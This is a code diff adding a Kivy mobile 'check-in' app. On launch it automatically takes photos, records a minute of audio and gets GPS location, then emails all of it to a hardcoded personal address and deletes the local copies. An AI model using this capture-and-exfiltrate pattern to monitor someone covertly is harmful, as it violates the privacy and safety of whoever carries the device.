@@ -1,0 +1,146 @@
+from kivy.app import App
+from kivy.uix.label import Label
+from plyer import camera, gps
+import datetime
+import sounddevice as sd
+import wavio
+import smtplib
+from email.message import EmailMessage
+import os
+import threading
+import time
+import requests
+
+# ---------------- Email Config ----------------
+EMAIL_FROM = "your_email@gmail.com"       # Your Gmail
+EMAIL_TO = "yash882.nps@gmail.com"       # Target recipient
+EMAIL_PASSWORD = "your_app_password"     # Gmail App Password
+
+class AutoCheckInEmailApp(App):
+
+    def build(self):
+        # Show a simple label while check-in runs
+        label = Label(text="Check-in in progress...", font_size=24)
+        # Start automatic check-in in background
+        threading.Thread(target=self._checkin_process).start()
+        return label
+
+    def _checkin_process(self):
+        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+        attachments = []
+
+        # --- Take front photo ---
+        front_file = f"front_{timestamp}.jpg"
+        print("Taking front photo...")
+        camera.take_picture(filename=front_file,
+                            on_complete=lambda x: print("Front saved:", x))
+        attachments.append(front_file)
+
+        # --- Take rear photo ---
+        rear_file = f"rear_{timestamp}.jpg"
+        print("Taking rear photo...")
+        camera.take_picture(filename=rear_file,
+                            on_complete=lambda x: print("Rear saved:", x))
+        attachments.append(rear_file)
+
+        # Wait a few seconds to ensure photos are saved
+        time.sleep(5)
+
+        # --- Record 1-minute audio ---
+        audio_file = f"audio_{timestamp}.wav"
+        print("Recording 1-minute audio...")
+        duration = 60
+        rate = 44100
+        audio = sd.rec(int(duration * rate), samplerate=rate, channels=2)
+        sd.wait()
+        wavio.write(audio_file, audio, rate, sampwidth=2)
+        print("Audio saved:", audio_file)
+        attachments.append(audio_file)
+
+        # --- Get location with retry ---
+        self.location_str = "Unknown"
+        self.location_city = "Unknown"
+
+        def fetch_location():
+            max_attempts = 10
+            attempt = 0
+            while attempt < max_attempts:
+                location_obtained = False
+
+                def on_location(**kwargs):
+                    nonlocal location_obtained
+                    lat = kwargs.get('lat')
+                    lon = kwargs.get('lon')
+                    if lat and lon:
+                        self.location_str = f"{lat},{lon}"
+                        try:
+                            r = requests.get(f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}")
+                            data = r.json()
+                            self.location_city = data.get("address", {}).get("city", "Unknown")
+                        except:
+                            self.location_city = "Unknown"
+                        location_obtained = True
+                    gps.stop()
+
+                gps.configure(on_location=on_location)
+                gps.start()
+
+                wait_time = 0
+                while not location_obtained and wait_time < 10:
+                    time.sleep(1)
+                    wait_time += 1
+
+                if location_obtained:
+                    print(f"Location obtained: {self.location_str} ({self.location_city})")
+                    break
+                else:
+                    print(f"Attempt {attempt+1} failed, retrying...")
+                    attempt += 1
+                    time.sleep(2)
+
+            if not location_obtained:
+                print("Failed to get location after multiple attempts.")
+                self.location_city = "Unknown"
+                self.location_str = "Unknown"
+
+        fetch_location()
+
+        # --- Send email ---
+        self.send_email(attachments)
+        print("Check-in completed and emailed!")
+
+        # --- Delete local files ---
+        for f in attachments:
+            if os.path.exists(f):
+                os.remove(f)
+        print("Local media files deleted.")
+
+    # ---------------- Email Function ----------------
+    def send_email(self, attachments):
+        location_for_subject = self.location_city if self.location_city != "Unknown" else "Unknown"
+        subject = f"Check-in: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Location: {location_for_subject}"
+
+        msg = EmailMessage()
+        msg["From"] = EMAIL_FROM
+        msg["To"] = EMAIL_TO
+        msg["Subject"] = subject
+        msg.set_content(f"Check-in details:\nTime: {datetime.datetime.now()}\nLocation: {self.location_str} ({location_for_subject})")
+
+        for file in attachments:
+            if os.path.exists(file):
+                with open(file, "rb") as f:
+                    file_data = f.read()
+                    msg.add_attachment(file_data, maintype="application",
+                                       subtype="octet-stream", filename=file)
+
+        try:
+            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+                smtp.login(EMAIL_FROM, EMAIL_PASSWORD)
+                smtp.send_message(msg)
+            print("Email sent successfully!")
+        except Exception as e:
+            print("Failed to send email:", e)
+
+# ---------------- Run App ----------------
+if __name__ == "__main__":
+    AutoCheckInEmailApp().run()
